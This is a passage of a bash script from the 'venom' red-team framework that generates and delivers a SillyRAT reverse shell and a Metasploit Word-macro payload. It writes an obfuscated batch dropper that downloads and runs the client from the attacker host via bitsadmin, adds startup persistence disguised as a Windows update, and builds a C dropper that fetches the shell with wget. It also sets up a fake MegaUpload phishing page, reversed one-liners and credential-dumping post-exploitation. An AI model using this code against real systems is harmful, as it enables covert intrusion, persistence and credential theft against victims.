      echo "" && sudo apt-get update -qq && apt-get install -y mingw32 && echo ""
      ComP="i586-mingw32msvc-gcc" # GCC library used to compile binary
   fi
fi

## Check if python3 its installed on attacker machine
audit=$(python3 --version > /dev/null 2>&1) > /dev/null 2>&1
if [ "$?" -ne "0" ]; then
   echo "${RedF}[ERROR] python3 interpreter not found${white}";sleep 2
   echo "${BlueF}[${YellowF}i${BlueF}]${white} python3 its required in Attacker/Target to exec Server/Client.${white}";
   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing python3 package.";sleep 2
   echo "" && sudo apt-get update -qq && apt-get install -y python python3 && echo ""
fi

## Check if 'venomconf' local file exists
if ! [ -e "$IPATH/bin/SillyRAT/venomconf" ]; then
   cd $IPATH/bin/SillyRAT
   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing SillyRAT requirements.";sleep 2
   echo "" && sudo pip3 install -r requirements.txt && echo ""
   ## Write 'venomconf' file to prevent the install function from running again
   echo "venom 'SillyRAT' configuration file" > venomconf
   cd $IPATH
fi


# -------------------------------------------------------


## Store User Inputs (module bash variable declarations)..
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
Drop=$(zenity --title="☠ Enter AGENT|DROPPER FILENAME ☠" --text "example: Procmom\nWarning: Allways Start FileNames With 'Capital Letters'" --entry --width 300) > /dev/null 2>&1
SOSP=$(zenity --list --title "☠ Target Operative system sellection ☠" --text "Remark: Sellecting 'Cancel' or 'Mac' will not create the dropper.\nWithout the dropper the Client.py requires to be manual executed\nand it will no longer auto-install SillyRAT python3 dependencies." --radiolist --column "Pick" --column "Option" TRUE "Windows" FALSE "Linux" FALSE "Mac" --height 240) > /dev/null 2>&1
if [ "$SOSP" = "Windows" ]; then rpath=$(zenity --title="☠ Enter Files Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1;fi

Id=$(cat /dev/urandom | tr -dc '0-7' | fold -w 3 | head -n 1)
easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
## Setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="666";fi
if [ -z "$rpath" ]; then rpath="%tmp%";fi
if [ -z "$SOSP" ]; then SOSP="windows";fi
if [ -z "$Drop" ]; then Drop="Procmom";fi
wvd=$(echo $rpath|sed "s|^[%]|\$env:|"|sed "s|%||")
if [ "$SOSP" = "Windows" ]; then
   targetos="$SOSP"
   uploadpath="$rpath => ($wvd)"
   if [ "$easter_egg" = "ON" ] || [ "$vbsevasion" = "ON" ]; then
      lolbin="bitsadmin (DownloadFile)"
      dropperpath="$IPATH/output/$Drop.bat"
   else
      lolbin="Powershell (DownloadFile)"
      dropperpath="$IPATH/output/$Drop.exe"
   fi
elif [ "$SOSP" = "Linux" ]; then
   targetos="$SOSP"
   uploadpath="/tmp => (remote)"
   lolbin="wget (DownloadFile)"
   dropperpath="$IPATH/output/$Drop"
else # Mac or multi-platforms
   lolbin="http => MegaUpload.html"
   targetos="Multi-Platforms"
   uploadpath="NULL => Client.py manual execution"
   dropperpath="NULL => Client.py manual execution"
fi


## Display final settings to user.
if [ "$vbsevasion" = "ON" ]; then echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 2;fi
echo ${BlueF}"---"
cat << !
    LPORT    : $lport
    LHOST    : $lhost
    TARGETOS : $targetos distros
    LOLBin   : $lolbin
    DROPPER  : $dropperpath
    AGENT    : $IPATH/output/$Drop.py
    UPLOADTO : $uploadpath
!
echo "---"


cd $IPATH/output
if [ "$SOSP" = "Windows" ]; then

   ## BUILD DROPPER (Install python3/Download/Execute Client.py)
   # Remark: Its mandatory the install of python3/pip3 SillyRAT rat
   # requirements in target system before executing the Client.py remote.
   if [ "$easter_egg" = "ON" ] || [ "$vbsevasion" = "ON" ]; then
      ## Build dropper.bat (IF: OBFUSCATION=ON | IF: categorie nº8 - Agent nº6)
      echo "${BlueF}[☠]${white} Creating dropper BAT Program."${Reset};sleep 2
      echo ":: Framework: Venom v1.0.17 - shinigami" > $Drop.bat
      echo ":: Author: r00t-3xp10it (SSA RedTeam @2020)" >> $Drop.bat
      echo "@echo off&%@i%&title $Drop - 3.10.5-dev Windows Installer&%#i#%&set \$\$=-w 1&&set \$i=py&&set #?=." >> $Drop.bat
      echo "@i%'$%f n%i@%ot DEF%_@$%INE%@h%D IS_MIN%@$%IMI%,;f%ZE%i?%D se%@$%t IS_MIN%_#t%IMIZ%@=i%ED=1 &%@$%& ,s%i0%tA%@%Rt \"\" /mi%@$%n \"%~dpnx0\" %* &%i@_%& eX%@$%I%_i_%t" >> $Drop.bat
      echo "@p\"O\"%i%we^R%@%s\"h\"^e%db%ll \$C=p\"i\"%@%p sh%@%o^w t\"a\"b%@%ul^a%@%te;I%@%f(-n%@%ot(\$C)){p%@%i^p i\"n\"s%@%t^a%@%ll t\"a\"b%@%u^la%@%te py%@%n^pu%@%t p\"s\"u%@%t^i%@%l pi%@%l^l%@%o\"w\" pys%@%cr^ee%@%ns%@%h^ot p\"y\"i%@%ns^t%@%a\"l\"l%@%e^r}" >> $Drop.bat
      echo "@Po%@i%w\"E\"r%@i%s^He%@$%ll (nE%@i%W-Obj%@%eCt -Com^O%@$%bjec%@_%t Wsc%d0b%rip^t%#?%She%@$%l^l)%#?%Po%#i%pu^p(\"\"\"Ins%@$%tala%@i%tio%@s%n Com%@s%ple%@$%te%@_%d.%#?%\"\"\",4,\"\"\"$Drop - 3%#?%10%#?%5-dev Wi%@$%n%@%do%@i%ws In%@f%st%@_i#%al%R@%ler\"\"\",0+64)" >> $Drop.bat
      echo "@pOw^e%@%rS^h\"E\"%@_%lL %\$\$% bi%@$%t^s\"a\"%@i%d^m%@f%in %i()%/t^ra%@i%n\"s\"%@$%f^er pu%@%r^pl%@%e\"t\"e%@%a^m /do%@_%w^n%@i%l\"o\"%@#1%ad %(f$)%/p^ri%@$%or\"i\"%@i%ty fo%@$%r\"e\"g%@'%ro^u%@$%nd %-%ht%@%tp:/%@%/$lhost/$Drop.%\$i% $wvd\\$Drop.%\$i%" >> $Drop.bat
      echo "${BlueF}[☠]${white} Written $Drop.bat to output (obfuscated)"${Reset};sleep 2

      ## Persistence script execution (minimized terminal prompt) using BATCH script.
      wvd=$(echo $rpath|sed "s|^[%]|\$env:|"|sed "s|%||")
      persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\ndropper.bat will create KB4524147.update.bat on remote startup folder that\nruns '$Drop.py' with 8 sec of interval at startup until a valid connection its found." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
      if [ "$persistence" = "Add persistence" ]; then
         echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
         echo "echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 ^&^& start \"\" /min \"%%~dpnx0\" %%* ^&^& exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
         echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
         echo "echo echo Please wait, Updating system .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
         echo "echo Powershell -w 1 cd $wvd;python $Drop.py >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
         echo "echo exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
         echo "${BlueF}[${YellowF}i${BlueF}]${white} Persistence active on: $Drop.bat ..${white}";sleep 2
      fi
      echo "@c%@$%d $rpath &%@%& =pY%@%t^H%@%o\"N\" $Drop.%\$i%" >> $Drop.bat
      echo "=Exit" >> $Drop.bat

   else

      ## Build dropper.exe [flagged by AV] (default in categorie nº3 - Agent nº5)
      echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
      cp $IPATH/templates/sillyme.c $IPATH/output/dropper.c
      sed -i "s|LhOsT|$lhost|g" dropper.c
      sed -i "s|LpOrT|$lport|g" dropper.c
      sed -i "s|FiLNaMe|$Drop|g" dropper.c
      sed -i "s|TempDir|$rpath|g" dropper.c

      ## COMPILING C Program USING mingw32 OR mingw-W64 (attacker sellection)
      echo "${BlueF}[☠]${white} Compiling dropper using GCC mingw"${Reset};sleep 2
      # Special thanks to astr0baby for mingw32 -mwindows switch :D
      $ComP dropper.c -o $Drop.exe -lws2_32 -mwindows
      rm $IPATH/output/dropper.c > /dev/nul 2>&1
   fi

elif [ "$SOSP" = "Linux" ]; then

      ## Set Agent (Client.py) execution delay time in seconds (default 40)
      delayTime=$(zenity --title="☠ Enter Agent/Client execution delay time (sec) ☠" --text "example: 40\nThis delay time its required for the dropper to have time to finish\ninstall python3 dependencies before running the Client.py in background.\n(If this is NOT the dropper first time run then a delay of: 3 sec its enouth)." --entry) > /dev/null 2>&1
      if [ -z "$delayTime" ]; then delayTime="40";fi

      ## BUILD DROPPER (Install python3/Download/Execute Client.py)
      echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 1
      echo "${BlueF}[☠]${white} Client.py delayTime: $delayTime (sec)"${Reset};sleep 2
      echo "#include<stdio.h>" > $Drop.c
      echo "#include<stdlib.h>" >> $Drop.c
      echo "#include<string.h>" >> $Drop.c
      echo "#include<sys/types.h>" >> $Drop.c
      echo "#include<sys/wait.h>" >> $Drop.c
      echo "#include<unistd.h>" >> $Drop.c
      echo "" >> $Drop.c
      echo "/*" >> $Drop.c
      echo "Author: r00t-3xp10it (SSA RedTeam @2020)" >> $Drop.c
      if [ "$vbsevasion" = "ON" ]; then
         echo "Framework: Venom v1.0.17 - Amsi Evasion - Agent nº6" >> $Drop.c
      else
         echo "Framework: Venom v1.0.17 - Multi-OS - Agent nº5" >> $Drop.c
      fi
      echo "Function: Install python3 SillyRAT requirements before downloading and executing" >> $Drop.c
      echo "$Drop.py (Client reverse tcp python shell) detach from parent (dropper) process." >> $Drop.c
      echo "Mandatory dependencies: python3 and pip3 {tabulate pynput psutil pillow pyscreenshot pyinstaller}" >> $Drop.c
      echo "*/" >> $Drop.c
      echo "" >> $Drop.c
      echo "int main()" >> $Drop.c
      echo "{" >> $Drop.c
      echo "   /*" >> $Drop.c
      echo "   This fork(); function allow us to spawn a new child process (in background). This way i can" >> $Drop.c
      echo "   execute Client.py in background while continue the execution of the C program in foreground." >> $Drop.c
      echo "   Article: https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c" >> $Drop.c
      echo "   */" >> $Drop.c
      echo "   fflush(NULL);" >> $Drop.c
      echo "   int pid = fork();" >> $Drop.c
      echo "      if (pid > 0) {" >> $Drop.c
      echo "         /*" >> $Drop.c
      echo "         We are runing in parent process (child its also running)" >> $Drop.c
      echo "         Function: Install python3 and sillyrat requirements" >> $Drop.c
      echo "         */" >> $Drop.c
      echo "         printf(\"\\\n$Drop - 3.10.5-dev Linux Installer\\\n\");" >> $Drop.c
      echo "         printf(\"----------------------------------------------------\\\n\");" >> $Drop.c
      echo "         /* Display system information onscreen to target user */" >> $Drop.c
      echo "         sleep(1);system(\"c=\$(hostnamectl);echo \\\"\$c\\\"\");" >> $Drop.c
      echo "         printf(\"----------------------------------------------------\\\n\");" >> $Drop.c
      echo "" >> $Drop.c
      echo "            /* Install python3 and SillyRAT requirements if not found */" >> $Drop.c
      echo "            sleep(1);system(\"sudo apt-get update;apt-get install -y python3;pip3 install tabulate pynput psutil pillow pyscreenshot pyinstaller\");" >> $Drop.c
      echo "            printf(\"Done.. ALL $Drop requirements are satisfied.\\\n\");" >> $Drop.c
      echo "" >> $Drop.c
      echo "      }" >> $Drop.c
      echo "      else if (pid == 0) {" >> $Drop.c
      echo "         /*" >> $Drop.c
      echo "         We are running in child process (as backgrond job - orphan)." >> $Drop.c
      echo "         setsid(); allow us to detach the child (Client) from parent (dropper) process," >> $Drop.c
      echo "         allowing us to continue running the Client.py in ram even if parent process its terminated." >> $Drop.c
      echo "         */" >> $Drop.c
      echo "         setsid();" >> $Drop.c
      echo "         sleep($delayTime);system(\"cd /tmp && sudo /usr/bin/wget -qq http://$lhost/$Drop.py -O /tmp/$Drop.py && python3 $Drop.py\");" >> $Drop.c
      echo "      } return 0;" >> $Drop.c
      echo "}" >> $Drop.c

      ## COMPILING C Program USING GCC execstack
      echo "${BlueF}[☠]${white} Compiling dropper using GCC execstack"${Reset};sleep 2
      gcc -fno-stack-protector -z execstack $Drop.c -o $Drop
      chmod +x $IPATH/output/$Drop > /dev/null 2>&1
      # rm $IPATH/output/$Drop.c > /dev/nul 2>&1

else
: ## If 'Cancel' OR 'Mac' options sellected => Client.py its deliver insted of dropper.(exe|vbs)
fi


cd $IPATH/bin/SillyRAT
## Writting Client reverse tcp python shell to output
echo "${BlueF}[☠]${white} Writting Client reverse tcp shell to output."${Reset};sleep 2
gnome-terminal --title="SillyRAT - Generator Mode" --geometry=90x21 --wait -- sh -c "python3 server.py generate --address $lhost --port $lport --output $IPATH/output/$Drop.py --source && sleep 2" > /dev/null 2>&1


cd $IPATH/output
## OBFUSCATION: Make sure emojify obfuscator its installed
# Author: @chris-rands (https://github.com/chris-rands/emojify)
if [ "$SOSP" = "Windows" ]; then
   if [ "$easter_egg" = "ON" ] || [ "$vbsevasion" = "ON" ]; then
      echo "${BlueF}[☠]${white} Obfuscate Client.py rev tcp shell (emojify)"${Reset};sleep 2
      audit=$(pip3 show emojify) > /dev/null 2>&1
      if [ "$?" -ne "0" ]; then
         echo "${RedF}[ERROR] emojify obfuscator not found.${white}";sleep 2
         echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing emojify obfuscator."${Reset};
         echo "" && sudo apt-get update && pip3 install emojify && echo ""
      fi
      ## Obfuscate Client.py sourcecode using emojify
      emojify --input $Drop.py --output obfuscated.py > /dev/nul 2>&1
      mv obfuscated.py $Drop.py > /dev/nul 2>&1
      echo "${BlueF}[${YellowF}i${BlueF}]${white} $Drop.py successfully obfuscated."${Reset};sleep 2
   fi
fi


cd $IPATH/templates/phishing
## Building 'the Download Webpage' in HTML
echo "${BlueF}[☠]${white} Building HTML Download WebPage (apache2)"${Reset};sleep 2
sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > MegaUpload.html
mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1

cd $IPATH/output
echo "${BlueF}[☠]${white} Porting required files to apache2 webroot."${Reset};sleep 2
if [ "$SOSP" = "Windows" ]; then

   if [ "$easter_egg" = "ON" ] || [ "$vbsevasion" = "ON" ]; then
      zip $Drop.zip $Drop.bat > /dev/nul 2>&1 # ZIP dropper.bat
      cp $IPATH/output/$Drop.py $ApAcHe/$Drop.py > /dev/nul 2>&1 # rev tcp Client shell
      mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
   else
      zip $Drop.zip $Drop.exe > /dev/nul 2>&1 # ZIP dropper.exe
      cp $IPATH/output/$Drop.py $ApAcHe/$Drop.py > /dev/nul 2>&1 # rev tcp Client shell
      mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
   fi

elif [ "$SOSP" = "Linux" ]; then
   zip $Drop.zip $Drop > /dev/nul 2>&1 # ZIP dropper.c
   cp $IPATH/output/$Drop.py $ApAcHe/$Drop.py > /dev/nul 2>&1 # rev tcp Client shell
   mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
else # Mac or multi-platforms
   zip $Drop.zip $Drop.py > /dev/nul 2>&1 # ZIP rev tcp Client shell
   mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # rev tcp Client shell ziped
fi


cd $IPATH
## Print attack vector on terminal
echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
echo "${BlueF}---";
echo "${BlueF}- ${RedBg}ATTACK VECTORS AVAILABLE TO DELIVER DROPPER${Reset}"
echo "${BlueF}- ${YellowF}URL LINK:${BlueF} http://$lhost/MegaUpload.html"
if [ "$SOSP" = "Linux" ]; then
   ## Build 'onelinner' download/execute dropper (obfuscated)
   original_string="sudo /usr/bin/wget -qq http://$lhost/$Drop.zip;unzip $Drop.zip;./$Drop"
   ## Reverse original string (venom attack vector)
   xterm -T " Reversing Original String (oneliner)" -geometry 110x23 -e "rev <<< \"$original_string\" > /tmp/reverse.txt"
   reverse_original=$(cat /tmp/reverse.txt);rm /tmp/reverse.txt
   ## Display onelinner(s) option(s) to attacker.
   echo "-";echo "- ${YellowF}ONELINER:"${BlueF};
   echo "- $original_string";echo "-"
   echo "- ${YellowF}ONELINER_OBFUSCATED:"${BlueF};
   echo "- rev <<< \"$reverse_original\"|\$0"
fi
echo "${BlueF}---"${Reset};
echo -n "${BlueF}[${YellowF}i${BlueF}]${white} Press any key to start a handler."
read stupidpause


cd $IPATH/output
## START SERVER HANDLER ON SELLECTED IP/PORT NUMBER
cp $IPATH/bin/SillyRAT/server.py $IPATH/output/server.py > /dev/nul 2>&1
echo "" && python3 server.py bind --address 0.0.0.0 --port $lport
cd $IPATH
sleep 2


## Clean old files.
echo "${BlueF}[☠]${white} Please Wait, cleaning old files.${white}";sleep 2
rm $ApAcHe/$Drop.py > /dev/nul 2>&1
rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
rm $IPATH/output/$Drop > /dev/nul 2>&1
rm $IPATH/output/$Drop.c > /dev/nul 2>&1
rm $IPATH/output/$Drop.py > /dev/nul 2>&1
rm $ApAcHe/Download.html > /dev/nul 2>&1
rm $IPATH/output/dropper.c > /dev/nul 2>&1
rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
rm $ApAcHe/webserver.ps1 > /dev/nul 2>&1
rm $IPATH/output/Obfuscated.bat > /dev/nul 2>&1
rm $IPATH/output/vbs-obfuscator.py > /dev/nul 2>&1
rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1


cd $IPATH/output
## Persistence handler script (zip) creation ..
if [ "$persistence" = "Add persistence" ]; then

   dtr=$(date|awk {'print $2,$3,$4,$5'})
   cp $IPATH/bin/handlers/handler3.sh $IPATH/output/handler.sh
   ## Config handler script variable declarations ..
   two=$(cat handler.sh | egrep -m 1 "ID") > /dev/null 2>&1
   sed -i "s|$two|ID='$Id'|" handler.sh
   tree=$(cat handler.sh | egrep -m 1 "CLIENT") > /dev/null 2>&1
   sed -i "s|$tree|CLIENT='$Drop.py'|" handler.sh
   four=$(cat handler.sh | egrep -m 1 "LPORT") > /dev/null 2>&1
   sed -i "s|$four|LPORT='$lport'|" handler.sh
   five=$(cat handler.sh | egrep -m 1 "LHOST") > /dev/null 2>&1
   sed -i "s|$five|LHOST='$lhost'|" handler.sh
   seven=$(cat handler.sh | egrep -m 1 "RPATH") > /dev/null 2>&1
   sed -i "s|$seven|RPATH='$rpath\\\\$Drop.py'|" handler.sh
   oito=$(cat handler.sh | egrep -m 1 "FIRST_ACCESS") > /dev/null 2>&1
   sed -i "s|$oito|FIRST_ACCESS='$dtr'|" handler.sh
   nove=$(cat handler.sh | egrep -m 1 "DROPPER") > /dev/null 2>&1
   sed -i "s|$nove|DROPPER='$Drop.bat'|" handler.sh


   ## Write README file (to be compressed)
   echo "Id          : $Id" > README
   echo "Description : Reverse TCP python Shell (SillyRAT)" >> README
   echo "Categorie   : Amsi Evasion (agent nº6)" >> README
   echo "Active On   : $dtr" >> README
   echo "Lhost|Lport : $lhost:$lport" >> README
   echo "" >> README
   echo "Instructions" >> README
   echo "------------" >> README
   echo "1 - cd output" >> README
   echo "2 - unzip handler_ID:$Id.zip" >> README
   echo "3 - sh handler.sh" >> README
   echo "" >> README
   echo "Detail Description" >> README
   echo "------------------" >> README
   echo "If sellected 'add persistence' to dropper in venom amsi evasion" >> README
   echo "agent nº6 build. Them the dropper when executed it will create in" >> README
   echo "remote target startup folder a script named 'KB4524147.update.bat'" >> README
   echo "that beacons home from 8 to 8 sec until a valid tcp connection is found" >> README
   echo "and creates this handler file (zip) to store attacker handler settings." >> README


   ## zip handler files
   echo "${BlueF}[${YellowF}i${BlueF}]${YellowF} Compressing (zip) handler files .."${Reset};sleep 2
   zip handler_ID:$Id.zip handler.sh server.py README -m -q
   cd $IPATH
   zenity --title="☠ Reverse TCP python Shell (SillyRAT) ☠" --text "Persistence handler files stored under:\n$IPATH/output/handler_ID:$Id.zip" --info --width 340 --height 130 > /dev/null 2>&1
fi

cd $IPATH
vbsevasion="OFF"
sh_menu
}





# ---------------------------------------------------
# astrobaby word macro trojan payload (windows.c) OR
# exploit/multi/fileformat/office_word_macro (python)
# ---------------------------------------------------
sh_world23 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: astrobaby" --width 300) > /dev/null 2>&1
Targ=$(zenity --list --title "☠ CHOSE TARGET SYSTEM ☠" --text "chose target system .." --radiolist --column "Pick" --column "Option" TRUE "WINDOWS" FALSE "MAC OS x" --width 305 --height 100) > /dev/null 2>&1

## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="astrobaby";fi
if [ -z "$Targ" ]; then Targ="WINDOWS";fi

  # config rigth arch (payload+format)
  if [ "$Targ" = "WINDOWS" ]; then
    taa="0"
    orm="C"
    paa="windows/meterpreter/reverse_tcp"
  else
    taa="1"
    orm="PYTHON"
    paa="python/meterpreter/reverse_tcp"
  fi


# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : $orm -> $Targ
    PAYLOAD : $paa
    AGENT   : $IPATH/output/$N4m.docm

!

   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $IPATH/templates/astrobaby.c ]; then
      echo "[☠] astrobaby.c -> found!"
      sleep 2
   else
      echo "[☠] astrobaby.c -> not found!"
      exit
   fi

   # check if mingw32 exists
   audit=`which $ComP`> /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
      echo "[☠] mingw32 compiler -> found!"
      sleep 2
 
   else

      echo "[☠] mingw32 compiler -> not found!"
      echo "[☠] Download compiler -> apt-get install mingw32"
      echo ""
      sudo apt-get install mingw32
      echo ""
      fi


# building template (windows systems)
if [ "$Targ" = "WINDOWS" ]; then
echo "[☠] editing/backup files .."
cp $IPATH/templates/astrobaby.c $IPATH/templates/astrobaby[bk].c > /dev/nul 2>&1
cd $IPATH/templates
sed -i "s|LhOsT|$lhost|g" astrobaby.c
sed -i "s|lPoRt|$lport|g" astrobaby.c
# obfuscation ??
UUID_1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 150 | head -n 1)
sed -i "s|UUID-RANDOM|$UUID_1|g" astrobaby.c
sleep 2

# compiling template (windows systems)
echo "[☠] Compiling using mingw32 .."
sleep 2
# i686-w64-mingw32-gcc astr0baby.c -o payload.exe -lws2_32 -mwindows
$ComP astrobaby.c -o payload.exe -lws2_32 -mwindows
strip payload.exe > /dev/null 2>&1
mv payload.exe $IPATH/output/$N4m.exe > /dev/null 2>&1
echo "[☠] Binary: $IPATH/output/$N4m.exe .."
cd $IPATH
sleep 2
fi



# use metasploit to build shellcode
echo "[☠] Generating MS_word document .."
sleep 2
if [ "$Targ" = "WINDOWS" ]; then
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfconsole -q -x 'use exploit/multi/fileformat/office_word_macro; set EXE::Custom $IPATH/output/$N4m.exe; set BODY Please enable the Macro SECURITY WARNING in order to view the contents of the document; set target $taa; set PAYLOAD $paa; set LHOST $lhost; run; exit -y'" > /dev/null 2>&1
else
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfconsole -q -x 'use exploit/multi/fileformat/office_word_macro; set BODY Please enable the Macro SECURITY WARNING in order to view the contents of the document; set target $taa; set PAYLOAD $paa; set LHOST $lhost; run; exit -y'" > /dev/null 2>&1
fi

mv $H0m3/.msf4/local/msf.docm $IPATH/output/$N4m.docm > /dev/null 2>&1
echo "[☠] MS_word agent: $IPATH/output/$N4m.docm .."
sleep 2


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.docm\n\nchose how to deliver: $N4m.docm" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; exploit'"
        fi
      sleep 2


   else


if [ "$Targ" = "WINDOWS" ]; then
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 300) > /dev/null 2>&1
else
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "exploit_suggester.rc" --width 305 --height 200) > /dev/null 2>&1
fi


  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi



      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.docm|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.docm $ApAcHe/$N4m.docm > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.docm|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.docm $ApAcHe/$N4m.docm
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
